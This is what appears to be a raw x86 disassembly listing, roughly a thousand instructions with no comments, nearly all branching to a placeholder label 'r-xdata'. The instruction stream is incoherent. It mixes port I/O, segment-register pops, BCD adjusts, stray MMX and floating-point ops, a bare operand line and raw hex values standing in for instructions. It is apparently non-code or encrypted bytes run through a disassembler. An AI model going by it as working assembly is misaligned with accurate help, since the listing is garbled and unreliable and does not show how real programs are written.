btc [ ecx - 0x59957a6b ] ecx
or eax 0xe3e0d80a
jecxz r-xdata
and al 0xa6
xrstor [ eax + 0x270aaeb5 ]
cmp al 0x1c
sbb al 0x85
push 0xffffffa6
or edi [ ebx + 0x6a859189 ]
dec ebx
cmp ebx [ esp + ebx ]
or eax 0xa1c1c06
jae r-xdata
sbb ebx [ esp + ebx ]
jecxz r-xdata

mov ah 0xaf
jae r-xdata
sar [ eax ] 0x1
mov ah 0x66
mov [ edx - 0x1c1cc6f6 ] eax
push edi
mov esp 0x559e6a85
mov [ esi - 0x61957a44 ] ebp
push 0x859b8919
push 0xffffff9e
mov ecx 0x100a8789
mov [ ebp - 0x4249957b ] ecx
jae r-xdata
in al dx
jae r-xdata
pop edi
test [ edx - 0x62 ] ebp
jae r-xdata
push ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
nop [ esp + ebx ] bx
mov bl 0xa
cmp bl [ ebx ]
sbb al 0x1c
jecxz r-xdata
daa
out dx eax
mov ch 0xb
insd
leave
jecxz r-xdata
or esp [ edi + 0x8 ]
sbb al 0x1c
pushad
lss esi [ eax - 0x4be32f4c ]
and bp sp
daa
out 0xe3 al
jecxz r-xdata
inc bx
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
scasd [ edi ]
pop ebp
scasb [ edi ]
jae r-xdata
or edi esi
jae r-xdata
jae r-xdata
sbb al 0x1c
or cl [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
cmp eax 0xd01c1c1c
and edi [ ebp + edi * 4 + 0x737320b8 ]
cmpsd [ esi ] [ edi ]
or ah [ ebp + 0xb ]
sbb al 0x1c
outsb
sbb al 0x1c
mov ebp 0xa8789b9
adc dh al
jecxz r-xdata
test [ edx - 0x4a ] ebp
ror [ ebx ] cl
shl ebp cl
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
nop
jae r-xdata
sahf
jecxz r-xdata
push esp
jmp r-xdata
mov ah 0x89
loope r-xdata
push 0xb4b0b20f
rcr [ esp + esi * 4 ] 0x1
jae r-xdata
mov ecx esp
or ah [ ebx + 0x731c1c3c ]
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
jae r-xdata
or ax 0x1c06
sbb al 0xa
insd
sbb al 0x74
pavgw mm4 mm3
push edx
add bl [ esp + ebx ]
jae r-xdata
or ecx [ edi + 0xa1c1c08 ]
leave
mov bl 0xb4
sbb al 0x1c
jae r-xdata
xchg edx eax
in al dx
jecxz r-xdata
push esp
rol [ ebp - 0x2f5ea9a ] 0x1
loopne r-xdata
and esi [ ebx - 0x51911e77 ]
inc edi
jae r-xdata
idiv [ ecx ]
jae r-xdata
and [ edx + 0x6a859689 ] edi
xchg edi eax
jae r-xdata
jae r-xdata
push 0xffffffa6
pop es
or ch [ 0x6e1c1c39 ]
jae r-xdata
jecxz r-xdata
or ah cl
std
jecxz r-xdata
inc cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
shl ebx 0xe3
and cx [ edx ]
cmp ebp esp
jecxz r-xdata
sbb al 0xb5
or [ edx ] 0xffffff8f
mov al 0xa
lodsb [ esi ]
loopne r-xdata
cmp edi [ edx + 0x51be6a85 ]
jae r-xdata
mov [ 0xffffffff89b323d0 ] eax
loope r-xdata
test [ edx - 0x52 ] ebp
sub ebp [ eax + 0x2b ]
shl [ ebx ] 0x1
test [ edx - 0x42 ] ebp
push ebp
test [ edx - 0x5a ] ebp
xor eax edx
cmp [ esi - 0x5a ] ch
aaa
test [ edx - 0x6a ] ebp
sub eax 0x85eb9668
push 0xffffffbe
pop ebx
push 0x20ab339
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
and bp sp
adc [ bp + di ] 0x1c
sbb al 0x6e
pushad
daa
cmpsb [ esi ] [ edi ]
inc edi
or ebp ecx
in al dx
jecxz r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
push ds
sbb al 0x1c
pop ds
mov dl 0xa
scasb [ edi ]
jecxz r-xdata
jae r-xdata
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
aas
mov al 0xa
loope r-xdata
test [ edx - 0x4a ] ebp
cmp ecx [ edx ]
jecxz r-xdata
jae r-xdata
mov esi 0xae6a8551
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ edx + 0x73e3e3ec ]
jae r-xdata
push 0xffffffae
in al dx
jae r-xdata
fld [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov al 0x85
jae r-xdata
cmc
jecxz r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov al [ 0xffffffffe064e768 ]
cmpsb [ esi ] [ edi ]
inc ecx
push 0xffffffae
jae r-xdata
jecxz r-xdata
in al dx
pop ebx
loop r-xdata
rol [ esi ] 0x1
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
and esp [ ebx + 0x1c02670a ]
jae r-xdata
scasb [ edi ]
daa
push 0xbe6a853c
push ebx
push 0x6a85ba3b
mov [ edi + 0x21ae6a85 ] edx
mov edx 0x6a859689
jae r-xdata
jae r-xdata
cmp eax 0xd0e3e3f2
pop es
push 0x1b2207a6
cld
dec ebx
loop r-xdata
scasb [ edi ]
outsb
xchg di ax
sbb [ esp + ebx ] bl
or ch ah
in eax 0xe3
jecxz r-xdata
or bh [ edi ]

mov [ ebp + eax * 4 - 0x45f65196 ] eax
mov [ edx + 0xfae6a85 ] ecx
or al [ edi - 0x131c1c06 ]
rol [ 0x1c1c ] 0x1
jae r-xdata
outsb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ ecx - 0x39ecf565 ]
jecxz r-xdata
jae r-xdata
or ah [ edi + 0x2 ]
jae r-xdata
test [ edx - 0x52 ] ebp
in al dx
sbb al 0x89
or cl [ edi + 0x1f ]
test [ ebx - 0x1e ] ebx
cmp eax 0xd0e3e3f2
jae r-xdata
mov [ ebx - 0x1c39ecf6 ] ebx
jecxz r-xdata
jmp r-xdata
push 0x54ec1fa6
sbb al 0xec
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
scasb [ edi ]
cmp [ edx + 0x6a85cd89 ] edi
scasb [ edi ]
aas
mov edx 0x3dae6a85
push 0xa66a852b
pushad
pop es
shl [ ebx ] 0x1
scasb [ edi ]
cmp eax 0x6a852b68
cmpsb [ esi ] [ edi ]
out 0xa0 eax
push 0xa6e064e7
cmpsb [ esi ] [ edi ]
pop ds
in al dx
push esp
push ds
jae r-xdata
jae r-xdata
add bl [ esp + ebx ]
jae r-xdata
sbb ebx [ edx + ecx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
ficomp [ edi + 0x67ecc3c7 ]
jecxz r-xdata
push 0xffffffa6
push esp
cmp al 0x35
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ 0x73731c1c ] ecx
sbb ebx [ esp + esi * 4 ]
xchg [ eax + 0x1b ] esp
sbb al 0xa
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
test [ edx - 0x52 ] ebp
xor eax 0x858289ba
push 0xffffffae
cmp edi [ edx + 0x6a858489 ]
jae r-xdata
or dl [ ecx ]
or eax 0x73731c1c
jae r-xdata
jae r-xdata
lahf
outsb
jae r-xdata
out 0x8b eax
mov al 0x1c
mov ch 0xf7
mov ah 0x1c
jne r-xdata
jae r-xdata
mov esp ebx
shl ebx cl
jecxz r-xdata
xor eax 0xe7891c1c
mov al 0xb5
test edx ebx
jmp r-xdata
jecxz r-xdata
sub bl bh
or bl bl
push 0xffffffa7
mov ebx 0x67ec2366
test al 0xf7
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push eax
or bl [ esp + ebx ]
jecxz r-xdata
ja r-xdata
push 0x18e40a0f
sbb al 0x1c
push 0xae6a852b
or edi [ edx + 0x6a858489 ]
scasb [ edi ]
or [ edx + 0x6a858a89 ] edi
scasb [ edi ]
mov [ 0x1c02670a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
pop es
jae r-xdata
sbb al 0x73
mov ah 0xa
cwde
jmp r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc ecx [ ecx + 0xa206891 ]
fdivr st2
jecxz r-xdata
mov [ esi - 0x59957a48 ] eax
push 0xa66a1ba6
jecxz r-xdata
jae r-xdata
or ch [ edx + 0x731c1c0d ]
mov al [ 0xffffffff901cb3fd ]
mov ebx 0xbb42568
mov esi 0x60e3e3fb
outsb
in al dx
jae r-xdata
jae r-xdata
push 0x87b41c1b
pushad
push 0xefa368e2
push 0xe368efa3
push 0xfba368e3
push 0xffffffe7
mov esi 0xba3b6853
jecxz r-xdata
add bl [ si ]
jae r-xdata
push 0x5e
aaa
push ds
sbb al 0x1c
and cx [ edx ]
loope r-xdata
jae r-xdata
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
sbb ebp [ edx - 0x5a ]
and esp [ ebx + 0x6a85202a ]
xor [ eax ] bl
adc eax 0x3c682d68
jae r-xdata
test [ eax + 0xa ] 0x77
out 0xe3 eax
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop ds
or dl [ edx + edi * 8 - 0x1d ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sahf
shl [ ebx ] 0x1
mov [ 0x6a85202a ] eax
jecxz r-xdata
mov edx 0xe3cba40b
jecxz r-xdata
sbb al 0x1c
mov edi esp
cmp al 0x35
jae r-xdata
push 0xee00a0f
sbb al 0x1c
jae r-xdata
mov al 0xb3
or esp ecx
or [ esp + ebx ] ebx
pushad
daa
out dx eax
mov al 0xa
or [ eax ] 0x6a731c1c
cmpsd [ esi ] [ edi ]
pushad
lahf
mov edi 0x6a67ece3

sbb al 0x1c
jae r-xdata
or dl [ edi + 0x731c1c18 ]
jae r-xdata
pushad
sub eax 0x18303c68
jae r-xdata
and al bl
jecxz r-xdata
mov ebx 0x85b88689
or [ ebx + 0x6a858489 ] edi
cmpsb [ esi ] [ edi ]
btc [ ecx - 0x59957a7a ] ecx
or eax 0xc1c00abb
jecxz r-xdata
xchg esi eax
jae r-xdata
jmp r-xdata
sbb al 0x1c
jae r-xdata
or dl [ ebx ]
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
sbb esp [ esi + 0x1c ]
test [ edx ] 0x1c1c1897
jae r-xdata
out 0xc7 eax
mov edx 0x73737320
jae r-xdata
daa
pushad
sbb al 0x1c
jae r-xdata
sbb esp edx
in al dx
sub bl bh
and [ ebx + 0x73 ] dh
mov ch 0x85
sti
jae r-xdata
mov ebx esi
or cl [ edi + 0x1f ]
or edx [ eax + 0xa ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb [ esp + ebx ] bl
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
push ebp
loop r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
or edi [ ebx + 0x6a858289 ]
cmpsb [ esi ] [ edi ]
scasb [ edi ]
add ecx [ edx ]
call 0x742a1e79
sbb al 0x96
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
xor [ ecx + 0xa0d0a86 ] ecx
cmc
jecxz r-xdata
in al dx
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
rcl [ 0x3c682d68 ] 0x1
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
or bh bl
or bl [ eax + 0x73e3e3eb ]
jae r-xdata
cli
jecxz r-xdata
jae r-xdata
pop edx
shl ebx cl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb4
mov bl 0xa
adc eax [ eax ]
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
push 0xffffff9e
pop ds
mov esp 0x6a85a189
sahf
push ebx
mov esp 0x519e6a85
outsb
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + edi + 0x1c ]
sbb al 0x73
mov ah 0xb4
mov ebx eax
or bh [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
sbb al 0x1c
test edx ebx
xlat
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
push 0x303c682d
sbb [ eax + 0x25 ] ah
jmp r-xdata
jae r-xdata
inc ebp
cmp esp [ esi + 0x38 ]
in al dx
adc [ di ] dh
cmpsb [ esi ] [ edi ]
pop es
jae r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
push 0x68e368e3
sbb al 0x1c
shr [ edx ] 0x1
fisubr [ esi + 0x2e65ecef ]
and edi [ ebp + 0x737320b8 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dl 0xa
sbb edx [ esp + ebx ]
sbb al 0x73
jae r-xdata
sbb al 0x75
imul esp ebx 0xffffffe3
in al dx
jl r-xdata
fcmovbe st7
mov ebx 0x73e3e3f9
jae r-xdata
sbb al 0xba
mov edx 0xb23bae6e
mov [ ebx + 0x6ab3951c ] esp
in al dx
jae r-xdata
dec esp
cmp ebx [ esp + ebx ]
jae r-xdata
mov ah 0xb3
jae r-xdata
jae r-xdata
jecxz r-xdata
fsubrp st2
jecxz r-xdata
inc [ esi ]
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
mul ebx
jecxz r-xdata
and eax 0xbf6ba1eb
push 0x6018303c
in al dx
fistp [ esi ]
or edi edi
jae r-xdata
mov eax 0x73737320
jae r-xdata
sbb al 0x96
adc ecx [ edx ]
xchg [ edx ] cl
jae r-xdata
or al dh
pop ss
sbb eax 0xb31c1c1f
jae r-xdata
jae r-xdata
mov bh 0xea
jecxz r-xdata
sbb al 0x1c
pushad
or al 0x1c
jae r-xdata
or dh al
sbb [ esp + ebx ] bl
jae r-xdata
mov ah 0x89
retn
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or cl [ ebx + 0x60e3e3c6 ]
cmpsb [ esi ] [ edi ]
pop ds

jae r-xdata
jae r-xdata
mov ebp 0x737320b8
jae r-xdata
push 0x36450a13
cmp eax 0x1c03b70a
test al 0xab
mov dl 0x68
test al 0xbb
or ecx [ edx ]
out dx eax
jecxz r-xdata
sbb al 0x1c
[ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or eax 0x731c1c0a
jae r-xdata
or al [ esi + 0x731c1c10 ]
jae r-xdata
inc bx
sbb al 0xb4
mov bl 0xb0
sbb al 0x74
dec edi
in al dx
and [ ebx + 0x73 ] dh
jae r-xdata
in al dx
push 0x68b2b20f
scasb [ edi ]
jmp r-xdata
or dh [ edi + 0x73e3e3ea ]
jae r-xdata
push esp
jae r-xdata
jae r-xdata
mov [ esi + 0x1c0a0d0a ] eax
jae r-xdata
or ah [ ebx + 0xa ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0xf7460a3b
jecxz r-xdata
sbb al 0x1c
mov edx 0x3bae6eba
mov dl 0x89
jae r-xdata
sbb al 0xb3
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jne r-xdata
jecxz r-xdata
mov [ 0x6ab3951c ] eax
jecxz r-xdata
and esp ecx
sbb al 0x60
in al dx
jae r-xdata
retn
xchg esi eax
push ds
inc ebx
jae r-xdata
mov dh 0x3f
or ebp [ ecx + 0xae3e3e1 ]
inc edi
cmp al 0x1c
sbb al 0x73
jae r-xdata
pushad
and ah cl
pushad
and ecx esp
test [ esi + 0x23 ] esp
in al dx
test eax 0xec1c1c37
push esp
loope r-xdata
and ah cl
pushad
jae r-xdata
xchg esi eax
push 0xffffffa6
sbb ebx [ esp + esi * 4 ]
mov bh 0x66
and ebp esp
or cl [ 0x731c1c0a ]
jae r-xdata
jecxz r-xdata
xchg edi eax
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
in al dx
or al 0x1c
jae r-xdata
jae r-xdata
push 0xffffffa6
jecxz r-xdata
xchg [ esp + esi * 4 ] ebx
jmp r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cld
jmp 0x73ba2107
jae r-xdata
jae r-xdata
mov cl 0x34
sbb al 0x1c
loope r-xdata
jae r-xdata
or bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
mov bl 0xb
jae r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffae
jae r-xdata
push 0x9b0a1ba6
jae r-xdata
push 0x630ab20f
lea ebp [ eax + 0x39 ]
test [ edx - 0x42 ] ebp
loope r-xdata
jae r-xdata
sbb al 0xb3
mov bl 0x1c
mov ah 0xb3
mov al 0x1c
je r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x97
jae r-xdata
and ebp [ esi - 0x47 ]
xor esp [ eax + 0x18 ]
0x1c0b1d0a 0x731c
or eax 0xd01c1c04
sub bl dl
scasb [ edi ]
out dx eax
in al dx
lea eax [ 0x140a1c1c ]
sbb [ esp + ebx ] bl
sbb al 0x73
outsb
scasb [ edi ]
cmp esi [ edx - 0x6ae35c77 ]
mov bl 0x6a
and bl ah
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
mov al 0xb5
mov ah 0x68
adc ebx [ edi - 0x1e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah bl
xor eax 0x73731c1c
jae r-xdata
push cs
sbb ecx [ edx ]
jae r-xdata
xchg [ eax ] dl
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
push esp
shl [ eax + 0x22 ] cl
loope r-xdata
in ax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
mov ebx esp
mov ch 0xb
rol [ esi ] cl
sbb al 0x1c
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
mov bl 0xa
fadd st0
jecxz r-xdata
or bl [ edx + 0x12 ]
jecxz r-xdata
sbb al 0xb5
fild [ eax - 0x5a ]
jae r-xdata
mov ebp ebx
loope r-xdata
loop r-xdata
jae r-xdata
fwait
jae r-xdata
jae r-xdata
jae r-xdata
or bl ah
jae r-xdata
test [ edx - 0x42 ] ebp
mov [ ebp + 0x6a853968 ] ecx
mov esi 0x6a85b8e1
mov esi 0xb8d589e7
xchg esi eax
shr [ edx ] 0x1
jae r-xdata
jno r-xdata
test [ edx - 0x42 ] ebp
sbb al 0x1c
mov dh 0x68
lss ecx [ edx ]
arpl [ edx ] cx
or bh bl
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x3b470ae5
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x68
sbb eax 0x1c1ed50a
sbb al 0x73
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
in al dx
sbb ebx eax
and al 0xa
retn 0xe3c0
into
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl bl 0xe3
shl [ ebx ] 0x1
and [ ebx + 0x73 ] dh
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
jae r-xdata
adc bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
in eax 0xa
push 0xffffffbe
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
jae r-xdata
pushad
jae r-xdata
sbb al 0x1c
or al [ edi + 0x3b ]
jae r-xdata
jae r-xdata
sbb al 0x1c
mov dh 0x68
lss esi [ edx - 0x4f145198 ]
or bh dh
jae r-xdata
jae r-xdata
or edx [ ecx ]
adc [ si ] ebx
sbb al 0x73
jae r-xdata
out 0x89 eax
push 0xffffffbe
jmp r-xdata
push 0x164a0b25
jae r-xdata
shl [ ebx ] 0x1
jae r-xdata
mov esp ebx
jae r-xdata
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
xor ebp [ esi + 0x66 ]
arpl [ esi ] bx
sbb al 0x1c
mov al 0xb3
cmpsb [ esi ] [ edi ]
jecxz r-xdata
and ecx [ edx ]
sub al 0xff
jae r-xdata
jae r-xdata
mov bl 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb ecx [ edx ]
paddd mm4 mm3
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jbe r-xdata
sbb al 0xec
pop ss
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0xb4
dec [ ebx - 0x1c1c9c1d ]
mov al 0xa
sbb al 0x96
or ch [ ecx + edi ]
sbb al 0x1c
push 0x1ed50a1d
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
cmp ebx [ esp + ebx ]
and bp sp
jae r-xdata
or eax 0x8b731c1c
jae r-xdata
add eax 0x73731c1c
aaa
sbb al 0x1c
push 0x110beba6
jae r-xdata
sbb al 0x1c
pushad
or ecx [ edx + 0x16 ]
jae r-xdata
mov edx 0x66ec2366
pop ebp
sbb [ esp + ebx ] bl
jae r-xdata
or ch [ edi + edi * 8 ]
push 0xffffffa6
jae r-xdata
mov al 0xa
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0xb3e3e3e2
jae r-xdata
jae r-xdata
in al dx
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov ch 0x87
scasb [ edi ]
jae r-xdata
jae r-xdata
punpckldq mmx1 [ edi ]
jae r-xdata
inc edi
jae r-xdata
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
outsb
mov ecx 0xea186033
or bl [ 0x731c1c0b ]
jae r-xdata
jae r-xdata
or ecx [ ebp + 0xa1c1c05 ]
adc al 0x18
sbb al 0x1c
jae r-xdata
pop cx
in eax dx
sbb al 0x60
jecxz r-xdata
sbb al 0x73
adc ebx eax
jae r-xdata
jecxz r-xdata
jae r-xdata
xor bh bh
jecxz r-xdata
jecxz r-xdata
jae r-xdata
shl dh 0x1
jecxz r-xdata
test [ eax - 0x25 ] esp
jecxz r-xdata
mov ch 0x68
adc ebp esp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
and [ esp + ebx ] edi
sbb al 0x68
lodsd [ esi ]

sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
insd
loopne r-xdata
popad
adc [ esp + ebx ] bl
mov ebx esp
sbb al 0x75
dec edi
and ebp esp
jae r-xdata
jae r-xdata
jecxz r-xdata
adc [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0xa
dec ebx
pop ss
sbb al 0x1c
jae r-xdata
mov al 0x36
sbb al 0x1c
or ch [ ecx ]
loope r-xdata
pop ds
pushad
sahf
pop ds
loopne r-xdata
or al 0x1c
push 0xed67ec13
mov [ ebp + 0x600a1b68 ] edx
sbb [ esp + ebx ] ebx
pushad
jae r-xdata
jecxz r-xdata
or bl bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
pushad
fninit
jecxz r-xdata
or ah cl
sbb al 0x1c
mov bh 0xea
bound ecx [ edi ]
xor [ esp + ebx ] bl
or cl dh
jae r-xdata
mov ch 0xdf
sbb al 0x73
aad 0xb8
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb dh [ ebx ]
sbb al 0x73
jae r-xdata
and [ si ] edi
sbb al 0x1c
push 0xa668cbad
aaa
and ebp esp
or dh [ ecx + 0x3b ]
or edi [ ebx - 0x4c1c1c1e ]
0xecd21a60 0x4266
sbb al 0x68
jae r-xdata
push 0xffffffa6
pop ss
mov [ edi - 0x57f5da98 ] edi
jecxz r-xdata
and eax 0xe3f7a80a
jae r-xdata
and ch [ edx ]
and [ ebx + 0x73 ] dh
jae r-xdata
push 0xa6d81fa6
mov edx 0xa323d0ba
or al [ edi + 0x73e3e3f4 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or eax [ 0x73731c1c ]
or dh [ ebx - 0x12 ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
out dx al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ edi + 0x11 ]
sbb al 0x1c
jae r-xdata
in eax dx
jae r-xdata
dec ebp
shl [ ebx ] 0x1
mov [ 0x73737320 ] eax
jae r-xdata
jae r-xdata
jae r-xdata
or ch [ eax + 0x73e3e3f7 ]
jae r-xdata
stosd [ edi ]
jae r-xdata
jae r-xdata
test al 0xf7
jae r-xdata
sbb ecx [ ebx ]
jae r-xdata
or cl [ edx + 0x73e3e3e1 ]
jae r-xdata
mov dl 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx al
jae r-xdata
loope r-xdata
movsd [ edi ] [ esi ]
fcom [ ebx ]
in al dx
popad
push 0x54ece7ab
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb ebp esp
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al dx
or ebx [ 0xffffffffb31c1c1f ]
jae r-xdata
pop ds
mul ebx
jae r-xdata
push esp
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffae
adc ecx [ edx ]
int3
cmpsb [ esi ] [ edi ]
salc
jae r-xdata
add eax 0x601c1c1b
cmp ah ch
jae r-xdata
and eax 0xd1f0ae1
pushad
sar [ edx + 0x68e26887 ] cl
xchg [ edi ] bl
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
push 0xffffffbe
jecxz r-xdata
jae r-xdata
pop ds
fucomi st6
push 0xa10d813
out 0xec eax
jae r-xdata
jae r-xdata
jae r-xdata
pushad
jae r-xdata
jae r-xdata
sbb al 0x1c
cmpsb [ esi ] [ edi ]
jae r-xdata
pop edx
jae r-xdata
jae r-xdata
mov [ 0x1fa66aeb ] eax
or dl cl
xor eax 0x73731c1c
mov ebx edx
mov edx 0x68e26887
sub ecx esp
jecxz r-xdata
jae r-xdata
jae r-xdata
daa
pushad
lahf
mov bl 0x68
and eax 0x1c164a0b
sbb al 0x60
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or eax 0x661c1c1b
in al dx
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
in al dx
jae r-xdata
sbb al 0x60
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
test [ edx - 0x42 ] ebp
jae r-xdata
mov ah 0xb3
jae r-xdata
xchg ebp eax
push 0x19600a1b
sbb al 0x1c
sbb edx ebp
in al dx
loope r-xdata
retn
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edx 0xaa323d0
xchg esp esi
jecxz r-xdata
jae r-xdata
jae r-xdata
fsub [ esi - 0x2f9813e5 ]
mul bl
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x8b
jae r-xdata
jae r-xdata
add eax 0x601c1c1b
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xor al 0xa
jae r-xdata
jae r-xdata
daa
sbb al 0x1c
jae r-xdata
mov esi 0xa3a68ef
jae r-xdata
sbb ecx [ ebx - 0x1c1c1d19 ]
jae r-xdata
or bl [ edi ]
jae r-xdata
in al dx
inc dx
sti
jecxz r-xdata
jae r-xdata
push ebp
adc [ esp + ebx ] ebx
xchg [ edi ] bl
jecxz r-xdata
pushad
mov dh 0xa
loope r-xdata
sbb al 0xb
jae r-xdata
push 0x20d8efa6
push 0xec1c663b
jae r-xdata
pushad
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
jae r-xdata
push 0xffffffee
jae r-xdata
or dl [ ecx + 0x37 ]
out dx eax
fsub [ eax ]
jae r-xdata
sbb al 0x1c
jmp r-xdata
jae r-xdata
jae r-xdata
push 0xfec40a3a
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb eax 0xb361ecc3
sbb [ esp + ebx ] bl
or edx [ edi ]
cli
jecxz r-xdata
sbb al 0x93
out dx eax
sbb al 0x93
jmp r-xdata
push 0x73202a22
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
push ds
sbb al 0x1c
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
and ecx [ edx ]
mov ah cl
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb al 0x34
jae r-xdata
jae r-xdata
in al dx
and [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x1c326e0a
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
push 0x18d60b1b
jae r-xdata
jecxz r-xdata
sbb al 0x1c
sbb [ esp + ebx ] bl
jae r-xdata
jecxz r-xdata
in al dx
and bp sp
jpe r-xdata
jae r-xdata
pop ds
jae r-xdata
mov bl 0x1c
or ch [ edx - 0x12 ]
jae r-xdata
jae r-xdata
push ecx
aaa
jae r-xdata
jae r-xdata
mov ebx esp
jae r-xdata
sbb al 0xa6
in al dx
popad
mov bl 0x18
sbb al 0x1c
push 0xe2e78b1b
outsb
jcxz r-xdata
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
